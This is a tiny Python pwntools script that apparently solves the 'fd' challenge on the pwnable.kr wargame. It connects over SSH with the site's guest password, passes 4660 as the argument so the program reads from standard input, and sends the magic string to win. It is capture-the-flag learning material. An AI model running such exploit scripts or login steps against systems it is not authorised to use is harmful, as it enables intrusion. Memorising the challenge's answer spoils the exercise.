#!/usr/bin/python
from pwn import *
r = ssh('fd','pwnable.kr',password='guest',port=2222)
process = r.process(executable='./fd',argv=['fd','4660'])
process.sendline('LETMEWIN')
print process.recv()
